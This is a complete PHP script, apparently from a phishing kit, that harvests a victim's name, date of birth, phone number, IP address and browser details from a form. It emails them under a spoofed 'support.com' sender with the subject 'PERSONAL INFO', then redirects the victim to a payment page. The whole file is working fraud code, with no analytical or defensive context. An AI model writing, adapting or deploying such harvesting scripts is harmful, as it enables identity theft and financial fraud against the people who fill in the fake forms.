<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$browzer = $_SERVER["HTTP_USER_AGENT"];
$message .= "==========[MEEDEVILE]=========<br>\n";
$message .= "|F-N-M        : ".$_POST['First']."<br>\n";
$message .= "|L-N-M        : ".$_POST['Last']."<br>\n";
$message .= "|D-O-B        : ".$_POST['Date']."<br>\n";
$message .= "|P-H-N        : ".$_POST['Phone']."<br>\n";
$message .= "===============[IP]==============<br>\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip<br>\n";
$message .= "==========[MEEDEVILE]=========<br>\n";

include '../e-mail.php';
$subject = "> PERSONAL INFO  $ip";
$headers = "From: ~MEEDEVILE~ <The.GrXn0v@support.com>";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\n";

mail($to, $subject, $message,$headers);

header("Location: ../paym.php?IP=$ip");
?>
